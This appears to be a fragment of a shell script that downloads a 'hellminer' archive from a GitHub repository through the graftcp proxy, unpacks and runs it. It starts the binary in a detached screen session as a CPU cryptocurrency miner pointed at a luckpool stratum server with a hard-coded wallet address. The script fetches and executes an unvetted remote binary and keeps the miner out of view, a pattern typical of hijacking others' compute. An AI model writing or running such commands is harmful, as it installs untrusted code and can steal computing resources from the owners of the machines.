...
./graftcp/graftcp nohup wget https://github.com/Asriytdx/kurama/raw/main/gedang.tar.gz
tar xf gedang.tar.gz
chmod +x hellminer

ph add hellminer

screen -d -m ./graftcp/graftcp ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RRtiCkRWjg1VpKtieBvsTD2tnUvNBswvga.SRUPUTT -p x --cpu 39
